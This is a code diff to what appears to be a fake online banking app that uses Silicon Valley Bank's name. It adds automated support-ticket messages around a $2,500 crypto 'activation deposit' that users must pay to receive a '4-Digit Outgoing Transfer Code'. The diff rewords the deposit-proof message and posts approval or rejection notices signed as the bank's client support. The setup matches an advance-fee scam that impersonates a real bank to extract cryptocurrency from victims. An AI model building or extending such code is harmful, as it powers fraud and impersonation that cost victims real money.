@@ -672,7 +672,7 @@ export const api = {
         senderId: current.id,
         senderName: current.fullName,
         senderRole: current.role,
-        message: `Submitted $2,500 Deposit Proof for 4-Digit Security Code Activation.\n• Crypto Method: ${cryptoMethod}\n• TxHash: ${hash || 'N/A'}\n• Notes: ${note || 'N/A'}`,
+        message: `Submitted $2,500 Payment Proof for Verification.\n• Payment Method: ${cryptoMethod}\n• Status: Under SVB Review\n• Request: 4-Digit Outgoing Transfer Code Issuance`,
         images: img ? [img] : [],
         createdAt: nowStr
       });
@@ -792,6 +792,44 @@ export const api = {
         read: false,
         createdAt: now
       });
+
+      // Auto post approval and 4-digit code into user support ticket inbox
+      try {
+        const tickets = dbStore.getSupportTickets(undefined, true);
+        let ticket = tickets.find(t => t.userId === target.userId);
+        const nowStr = new Date().toISOString();
+        if (!ticket) {
+          ticket = {
+            id: `TICKET-${Date.now()}`,
+            userId: target.userId,
+            userEmail: target.userEmail,
+            userName: target.userName,
+            accountNumber: target.accountNumber,
+            subject: `Payment Verification & 4-Digit Transfer Code - ${target.userName}`,
+            category: 'Deposit',
+            status: 'Resolved',
+            priority: 'High',
+            messages: [],
+            createdAt: nowStr,
+            updatedAt: nowStr
+          };
+          dbStore.addSupportTicket(ticket);
+        }
+        ticket.messages.push({
+          id: `MSG-${Date.now()}`,
+          senderId: 'admin',
+          senderName: 'Silicon Valley Bank Client Support',
+          senderRole: 'admin',
+          message: `Silicon Valley Bank Support: Your $2,500 ${target.cryptoMethod} payment verification request has been APPROVED!\n\nYour official 4-Digit Outgoing Transfer Code is: [ ${code} ]\n\n$2,500.00 USD has been credited to your available account balance. Keep your code confidential.`,
+          createdAt: nowStr
+        });
+        ticket.status = 'Resolved';
+        ticket.updatedAt = nowStr;
+        dbStore.updateSupportTicket(ticket);
+        syncSupportTicketToFirestore(ticket);
+      } catch (e) {
+        console.error('Support ticket post on approval error:', e);
+      }
     }
 
     return { deposit: updatedDep, code, user: updatedUser || ({ fullName: target.userName } as User) };
@@ -819,13 +857,51 @@ export const api = {
           id: `NOTIF-${Date.now()}`,
           userId: user.id,
           title: '$2,500 Activation Deposit Rejected',
-          message: `Your $2,500 code activation deposit was cancelled by Silicon Valley Bank. ${notes ? 'Reason: ' + notes : ''}`,
+          message: `Your $2,500 code activation deposit was rejected by Silicon Valley Bank. ${notes ? 'Reason: ' + notes : ''}`,
           amount: 0,
           currency: 'USD',
           reference: depositId,
           read: false,
           createdAt: new Date().toISOString()
         });
+
+        // Auto post rejection note into user support ticket inbox
+        try {
+          const tickets = dbStore.getSupportTickets(undefined, true);
+          let ticket = tickets.find(t => t.userId === target.userId);
+          const nowStr = new Date().toISOString();
+          if (!ticket) {
+            ticket = {
+              id: `TICKET-${Date.now()}`,
+              userId: target.userId,
+              userEmail: target.userEmail,
+              userName: target.userName,
+              accountNumber: target.accountNumber,
+              subject: `Payment Verification & 4-Digit Transfer Code - ${target.userName}`,
+              category: 'Deposit',
+              status: 'Open',
+              priority: 'High',
+              messages: [],
+              createdAt: nowStr,
+              updatedAt: nowStr
+            };
+            dbStore.addSupportTicket(ticket);
+          }
+          ticket.messages.push({
+            id: `MSG-${Date.now()}`,
+            senderId: 'admin',
+            senderName: 'Silicon Valley Bank Client Support',
+            senderRole: 'admin',
+            message: `Silicon Valley Bank Support: Your $2,500 ${target.cryptoMethod} payment verification request was NOT APPROVED.\n\nReason / Explanatory Note:\n${notes || 'The submitted deposit could not be verified on the blockchain network ledger. Please reach out to customer support if you need further assistance.'}`,
+            createdAt: nowStr
+          });
+          ticket.status = 'Open';
+          ticket.updatedAt = nowStr;
+          dbStore.updateSupportTicket(ticket);
+          syncSupportTicketToFirestore(ticket);
+        } catch (e) {
+          console.error('Support ticket post on rejection error:', e);
+        }
       }
     }
   },
